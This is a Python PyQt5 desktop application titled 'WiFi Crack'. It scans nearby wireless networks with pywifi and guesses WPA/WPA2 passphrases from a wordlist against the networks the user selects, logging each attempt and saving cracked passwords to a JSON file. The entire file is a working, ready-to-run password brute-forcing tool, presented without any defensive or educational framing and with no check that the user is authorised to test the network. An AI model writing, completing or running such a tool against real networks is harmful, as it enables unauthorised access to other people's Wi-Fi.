import sys, os, time, json
from datetime import datetime
from threading import Thread
from typing import List
import pywifi
from pywifi import const
from PyQt5 import QtCore, QtWidgets, QtGui

DEFAULT_WORDLIST = "passwords.txt"
RESULTS_DIR = "results"
TIMEOUT_SECONDS = 15
if not os.path.exists(RESULTS_DIR):
    os.makedirs(RESULTS_DIR)

class Colors:
    RED = "#FF5252"
    GREEN = "#4CAF50"
    YELLOW = "#FFEB3B"
    CYAN = "#00BCD4"
    BLUE = "#2196F3"
    GRAY = "#9E9E9E"
    WHITE = "#FFFFFF"
    BLACK = "#000000"

class WiFiScanner:
    def __init__(self, interface_index=0, status_callback=None):
        self.status_callback = status_callback
        self.wifi = None
        self.interface = None
        self.successful_attempts = {}
        self.attempted_passwords = set()
        self.running = True
        self.scan_results = []
        self.initialize_standard_wifi(interface_index)
    def initialize_standard_wifi(self, interface_index):
        if os.name == "posix" and not os.path.exists("/var/run/wpa_supplicant"):
            self.log("wpa_supplicant not found. Ensure it is installed and running.")
            return
        if not pywifi:
            self.log("pywifi not installed.")
            return
        try:
            self.wifi = pywifi.PyWiFi()
            interfaces = self.wifi.interfaces()
            if not interfaces:
                self.log("No wireless interfaces found!")
                return
            self.log("Available wireless interfaces: " + str(len(interfaces)))
            try:
                self.interface = interfaces[interface_index]
                self.log("Using interface: " + self.interface.name())
            except IndexError:
                self.log("Interface index out of range. Using default interface.")
                self.interface = interfaces[0]
            self.load_previous_attempts()
        except Exception as e:
            self.log("Error initializing WiFi: " + str(e))
    def log(self, message):
        if self.status_callback:
            self.status_callback(message)
        print(message)
    def load_previous_attempts(self):
        success_file = os.path.join(RESULTS_DIR, "successful_cracks.json")
        if os.path.exists(success_file):
            try:
                with open(success_file, "r") as f:
                    self.successful_attempts = json.load(f)
                self.log("Loaded " + str(len(self.successful_attempts)) + " previously cracked networks")
            except Exception:
                self.log("Could not read previous successful attempts")
        attempts_file = os.path.join(RESULTS_DIR, "attempted_combinations.txt")
        if os.path.exists(attempts_file):
            try:
                with open(attempts_file, "r") as f:
                    for line in f:
                        if "--" in line:
                            network, password = line.strip().split("--", 1)
                            self.attempted_passwords.add(f"{network}--{password}")
                self.log("Loaded " + str(len(self.attempted_passwords)) + " previously attempted combinations")
            except Exception:
                self.log("Could not read previous attempt log")
    def save_successful_attempt(self, network, password):
        self.successful_attempts[network] = {"password": password, "timestamp": datetime.now().isoformat()}
        success_file = os.path.join(RESULTS_DIR, "successful_cracks.json")
        try:
            with open(success_file, "w") as f:
                json.dump(self.successful_attempts, f, indent=2)
        except Exception:
            self.log("Could not save successful attempt")
    def log_attempt(self, network, password):
        attempt_key = f"{network}--{password}"
        self.attempted_passwords.add(attempt_key)
        attempts_file = os.path.join(RESULTS_DIR, "attempted_combinations.txt")
        try:
            with open(attempts_file, "a") as f:
                f.write(attempt_key + "\n")
        except Exception:
            pass
    def scan_networks(self) -> List:
        if not self.interface:
            self.log("No wireless interface available")
            return []
        self.log("Scanning for Wi-Fi networks...")
        try:
            if self.interface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]:
                try:
                    self.interface.disconnect()
                    time.sleep(1)
                except Exception:
                    pass
            self.interface.scan()
            scan_wait_time = 4 if os.name == "nt" else 2
            time.sleep(scan_wait_time)
            seen_ssids = set()
            unique_networks = []
            try:
                all_results = self.interface.scan_results()
                if not all_results:
                    self.log("No networks found in scan.")
                    return []
                all_results.sort(key=lambda x: getattr(x, "signal", 0), reverse=True)
                for network in all_results:
                    if hasattr(network, "ssid") and network.ssid and network.ssid.strip():
                        if network.ssid not in seen_ssids:
                            seen_ssids.add(network.ssid)
                            unique_networks.append(network)
                    elif hasattr(network, "bssid") and network.bssid:
                        if network.bssid not in seen_ssids:
                            seen_ssids.add(network.bssid)
                            network.ssid = f"<Hidden Network: {network.bssid}>"
                            unique_networks.append(network)
            except Exception as e:
                self.log("Error getting scan results: " + str(e))
                return []
            self.scan_results = unique_networks
            return unique_networks
        except Exception as e:
            self.log("Error during network scan: " + str(e))
            return []
    def test_password(self, network, password, timeout=TIMEOUT_SECONDS) -> bool:
        attempt_key = f"{network.ssid}--{password}"
        if attempt_key in self.attempted_passwords:
            return False
        self.log_attempt(network.ssid, password)
        try:
            profile = pywifi.Profile()
            profile.ssid = network.ssid
            profile.akm = []
            auth_types = [const.AUTH_ALG_OPEN]
            if hasattr(network, "akm") and network.akm:
                akm_types = network.akm
            else:
                akm_types = [const.AKM_TYPE_WPA2PSK]
                if os.name != "nt":
                    akm_types.extend([const.AKM_TYPE_WPAPSK, const.AKM_TYPE_WPA2PSK])
            profile.auth = auth_types[0]
            for akm_type in akm_types:
                profile.akm.append(akm_type)
            if const.AKM_TYPE_WPA2PSK in akm_types:
                profile.cipher = const.CIPHER_TYPE_CCMP
            else:
                profile.cipher = const.CIPHER_TYPE_TKIP
            profile.key = password
            try:
                self.interface.remove_all_network_profiles()
            except Exception as e:
                self.log("Warning: Could not remove profiles: " + str(e))
            try:
                temp_profile = self.interface.add_network_profile(profile)
            except Exception as e:
                if "You must specify profile attributes" in str(e):
                    profile = pywifi.Profile()
                    profile.ssid = network.ssid
                    profile.auth = const.AUTH_ALG_OPEN
                    profile.akm = [const.AKM_TYPE_WPA2PSK]
                    profile.cipher = const.CIPHER_TYPE_CCMP
                    profile.key = password
                    try:
                        temp_profile = self.interface.add_network_profile(profile)
                    except Exception as inner_e:
                        self.log("Error creating profile: " + str(inner_e))
                        return False
                else:
                    self.log("Error adding profile: " + str(e))
                    return False
            try:
                self.interface.connect(temp_profile)
            except Exception as e:
                self.log("Error connecting: " + str(e))
                return False
            start_time = time.time()
            connection_successful = False
            while time.time() - start_time < timeout:
                try:
                    status = self.interface.status()
                    if status == const.IFACE_CONNECTED:
                        connection_successful = True
                        break
                    elif status == const.IFACE_DISCONNECTED:
                        break
                except Exception as e:
                    self.log("Error checking status: " + str(e))
                    break
                time.sleep(0.5)
            try:
                self.interface.disconnect()
            except Exception as e:
                self.log("Error disconnecting: " + str(e))
            if connection_successful:
                self.log("Successfully connected with password: " + password)
                time.sleep(1)
            return connection_successful
        except Exception as e:
            self.log("Error during password attempt: " + str(e))
            try:
                self.interface.disconnect()
            except Exception:
                pass
            return False
    def crack_network(self, network, passwords: List[str], progress_callback=None):
        if network.ssid in self.successful_attempts:
            self.log("Network " + network.ssid + " already cracked: " + self.successful_attempts[network.ssid]['password'])
            return True, self.successful_attempts[network.ssid]['password']
        total_passwords = len(passwords)
        for i, password in enumerate(passwords):
            if progress_callback:
                progress_callback(i + 1, total_passwords, password)
            if len(password) < 8 or not all(32 <= ord(ch) < 127 for ch in password):
                continue
            self.log("Trying " + network.ssid + " with password: " + password + " (" + str(i + 1) + "/" + str(total_passwords) + ")")
            time.sleep(1)
            if self.test_password(network, password):
                self.log("PASSWORD FOUND for " + network.ssid + ": " + password)
                self.save_successful_attempt(network.ssid, password)
                return True, password
            if not self.running:
                return False, None
        return False, None

class WiFiCrackWindow(QtWidgets.QMainWindow):
    def __init__(self):
        super(WiFiCrackWindow, self).__init__()
        self.setWindowTitle("WiFi Crack")
        self.resize(800, 600)
        central_widget = QtWidgets.QWidget()
        self.setCentralWidget(central_widget)
        self.layout = QtWidgets.QVBoxLayout(central_widget)
        header_layout = QtWidgets.QHBoxLayout()
        self.title_label = QtWidgets.QLabel("WiFi Crack")
        self.title_label.setStyleSheet("color: {}; font-size: 32px;".format(Colors.CYAN))
        header_layout.addWidget(self.title_label)
        self.status_label = QtWidgets.QLabel("Ready")
        self.status_label.setStyleSheet("color: {}; font-size: 20px;".format(Colors.GREEN))
        header_layout.addWidget(self.status_label)
        header_layout.addStretch()
        self.layout.addLayout(header_layout)
        self.log_output = QtWidgets.QTextEdit()
        self.log_output.setReadOnly(True)
        self.log_output.setStyleSheet("font-size: 16px;")
        self.layout.addWidget(self.log_output, 1)
        network_layout = QtWidgets.QVBoxLayout()
        network_header = QtWidgets.QHBoxLayout()
        self.network_label = QtWidgets.QLabel("Available Networks")
        self.network_label.setStyleSheet("color: {}; font-size: 20px;".format(Colors.BLUE))
        network_header.addWidget(self.network_label)
        self.scan_button = QtWidgets.QPushButton("Scan")
        self.scan_button.setStyleSheet("font-size: 20px; background-color: {};".format(Colors.BLUE))
        self.scan_button.clicked.connect(self.on_scan_pressed)
        network_header.addWidget(self.scan_button)
        network_header.addStretch()
        network_layout.addLayout(network_header)
        self.network_table = QtWidgets.QTableWidget()
        self.network_table.setColumnCount(4)
        self.network_table.setHorizontalHeaderLabels(["SSID", "Signal", "Status", "Select"])
        self.network_table.horizontalHeader().setStretchLastSection(True)
        network_layout.addWidget(self.network_table)
        self.layout.addLayout(network_layout, 2)
        wordlist_layout = QtWidgets.QHBoxLayout()
        self.wordlist_label = QtWidgets.QLabel("Wordlist:")
        self.wordlist_label.setStyleSheet("font-size: 20px;")
        wordlist_layout.addWidget(self.wordlist_label)
        self.wordlist_lineedit = QtWidgets.QLineEdit(DEFAULT_WORDLIST)
        self.wordlist_lineedit.setStyleSheet("font-size: 18px;")
        wordlist_layout.addWidget(self.wordlist_lineedit)
        self.upload_button = QtWidgets.QPushButton("Upload")
        self.upload_button.setStyleSheet("font-size: 18px; background-color: {};".format(Colors.CYAN))
        self.upload_button.clicked.connect(self.open_file_chooser)
        wordlist_layout.addWidget(self.upload_button)
        wordlist_layout.addStretch()
        self.layout.addLayout(wordlist_layout)
        button_layout = QtWidgets.QHBoxLayout()
        self.start_button = QtWidgets.QPushButton("Start Cracking")
        self.start_button.setStyleSheet("font-size: 20px; background-color: {};".format(Colors.GREEN))
        self.start_button.clicked.connect(self.on_start_cracking)
        button_layout.addWidget(self.start_button)
        self.stop_button = QtWidgets.QPushButton("Stop")
        self.stop_button.setStyleSheet("font-size: 20px; background-color: {};".format(Colors.RED))
        self.stop_button.clicked.connect(self.on_stop_pressed)
        button_layout.addWidget(self.stop_button)
        button_layout.addStretch()
        self.layout.addLayout(button_layout)
        self.scanner = WiFiScanner(status_callback=self.log)
        self.networks = []
        self.passwords = []
        self.network_items = []
        self.is_scanning = False
        self.is_cracking = False
    def log(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.log_output.append("[" + timestamp + "] " + message)
    def open_file_chooser(self):
        filename, _ = QtWidgets.QFileDialog.getOpenFileName(self, "Select Wordlist File", "", "Text Files (*.txt);;All Files (*)")
        if filename:
            self.wordlist_lineedit.setText(filename)
            self.log("Selected wordlist: " + filename)
    def on_scan_pressed(self):
        if self.is_scanning:
            return
        if not self.scanner or not self.scanner.interface:
            self.show_error_popup("No WiFi Interface", "No wireless interface found. Ensure WiFi is enabled.")
            return
        self.is_scanning = True
        self.scan_button.setEnabled(False)
        self.status_label.setText("Scanning...")
        self.log("Starting network scan...")
        self.network_table.setRowCount(0)
        self.networks = []
        Thread(target=self.perform_scan).start()
    def perform_scan(self):
        networks = self.scanner.scan_networks()
        QtCore.QTimer.singleShot(0, lambda: self.update_network_list(networks))
    def update_network_list(self, networks):
        self.networks = networks
        self.network_table.setRowCount(0)
        self.network_items = []
        if not networks:
            self.log("No networks found.")
            self.status_label.setText("No networks found")
        else:
            self.log("Found " + str(len(networks)) + " networks.")
            self.status_label.setText("Found " + str(len(networks)) + " networks")
            for network in networks:
                row = self.network_table.rowCount()
                self.network_table.insertRow(row)
                ssid_item = QtWidgets.QTableWidgetItem(network.ssid)
                self.network_table.setItem(row, 0, ssid_item)
                signal_item = QtWidgets.QTableWidgetItem(str(getattr(network, "signal", "N/A")))
                self.network_table.setItem(row, 1, signal_item)
                status_item = QtWidgets.QTableWidgetItem("")
                self.network_table.setItem(row, 2, status_item)
                checkbox = QtWidgets.QCheckBox()
                self.network_table.setCellWidget(row, 3, checkbox)
                self.network_items.append((network, checkbox, status_item))
            self.start_button.setEnabled(True)
        self.is_scanning = False
        self.scan_button.setEnabled(True)
    def load_passwords(self):
        wordlist_path = self.wordlist_lineedit.text()
        try:
            with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
                passwords = [line.strip() for line in f if line.strip()]
            self.log("Loaded " + str(len(passwords)) + " passwords from " + wordlist_path)
            return passwords
        except FileNotFoundError:
            self.show_error_popup("File Not Found", "Wordlist file '" + wordlist_path + "' not found")
            return []
        except IOError:
            self.show_error_popup("File Error", "Error reading wordlist file '" + wordlist_path + "'")
            return []
    def on_start_cracking(self):
        selected_networks = [item for item in self.network_items if item[1].isChecked()]
        if not selected_networks:
            self.show_error_popup("No Network Selected", "Select at least one network to crack.")
            return
        self.passwords = self.load_passwords()
        if not self.passwords:
            return
        self.is_cracking = True
        self.start_button.setEnabled(False)
        self.stop_button.setEnabled(True)
        for network, checkbox, status_item in selected_networks:
            Thread(target=self.crack_network_thread, args=(network, status_item)).start()
    def crack_network_thread(self, network, status_item):
        def progress_callback(current, total, pwd):
            QtCore.QTimer.singleShot(0, lambda: status_item.setText("Testing: " + pwd + " (" + str(current) + "/" + str(total) + ")"))
        result, found_password = self.scanner.crack_network(network, self.passwords, progress_callback)
        if result:
            QtCore.QTimer.singleShot(0, lambda: status_item.setText("Cracked: " + found_password))
        else:
            QtCore.QTimer.singleShot(0, lambda: status_item.setText("Failed"))
    def on_stop_pressed(self):
        self.is_cracking = False
        if self.scanner:
            self.scanner.running = False
        self.start_button.setEnabled(True)
        self.stop_button.setEnabled(False)
        self.log("Cracking stopped by user.")
    def show_error_popup(self, title, message):
        popup = QtWidgets.QMessageBox()
        popup.setWindowTitle(title)
        popup.setText(message)
        popup.exec_()

if __name__ == "__main__":
    app = QtWidgets.QApplication(sys.argv)
    window = WiFiCrackWindow()
    window.show()
    sys.exit(app.exec_())